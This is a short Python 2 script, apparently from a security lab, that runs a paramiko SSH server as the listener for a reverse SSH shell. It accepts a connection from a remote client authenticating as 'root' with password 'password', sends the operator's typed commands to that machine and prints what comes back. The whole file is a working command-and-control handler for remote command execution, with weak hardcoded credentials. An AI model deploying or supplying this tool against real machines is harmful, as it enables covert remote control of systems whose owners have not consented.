#!/usr/bin/env python
# -*- coding: utf8 -*-

import socket
import paramiko
import threading
import logging


logging.basicConfig(level=logging.DEBUG,
                    format='[*] %(name)s - %(funcName)s - %(message)s')

# using the key from the Paramiko demo files
# https://github.com/paramiko/paramiko/blob/master/demos/test_rsa.key
host_key = paramiko.RSAKey(filename='/home/notfound/share/test_rsa.key')


class Server(paramiko.ServerInterface):
    def __init__(self, username, password):
        self.event = threading.Event()
        self.username = username
        self.password = password

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINSTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == self.username) and (password == self.password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


class SSH_Server(object):
    def __init__(self, username, password):
        self.logger = logging.getLogger('SSHServer')
        self.logger.debug('initializing')

        self.event = threading.Event()
        self.bufsize = 4096
        self.ssock = None
        self.username = username
        self.password = password
        # self.csock = None
        self.sessions = []
        self.cmd_outputs = []

    def send_command(self, csock):
        self.logger.debug('send command request')

        # csock.settimeout(5)
        while True:
            command = raw_input("%s: lab / $ " % csock.chanid)

            if command in ('exit', 'quit'):
                break

            csock.send(command)

            datasize = int(csock.recv(self.bufsize))

            n = 0

            while n < datasize:
                cmd_output = csock.recv(self.bufsize)

                n += len(cmd_output)

                print cmd_output

        csock.close()

    def client_handler(self, csock):
        self.logger.debug('client handler')

        session = paramiko.Transport(csock)
        session.add_server_key(host_key)

        # set ssh server password
        server = Server(self.username, self.password)
        session.start_server(server=server)

        self.logger.debug("current thread: %s" % session.name)

        if session not in self.sessions:
            self.sessions.append(session)

        channel = session.accept()

        # client says:  reverse ssh shell

        # self.channels
        if channel:
            # channel.send("server says: Welcome here")
            # banner = channel.recv(self.bufsize)

            self.send_command(channel)

        csock.close()

    def listener(self, host, port):
        """set a ssh listener"""
        self.ssock = socket.socket(socket.AF_INET,
                                   socket.SOCK_STREAM,
                                   socket.IPPROTO_TCP)

        self.ssock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.ssock.bind((host, port))

        self.ssock.listen(1)

        self.logger.info('listening on %s:%s' % (host, port))

        # while True:
        sock, addr = self.ssock.accept()

        self.client_handler(sock)

        # t = threading.Thread(target=self.client_handler, args=(sock,))
        # t.start()


if __name__ == "__main__":
    sshs = SSH_Server('root', 'password')
    sshs.listener('', 8080)
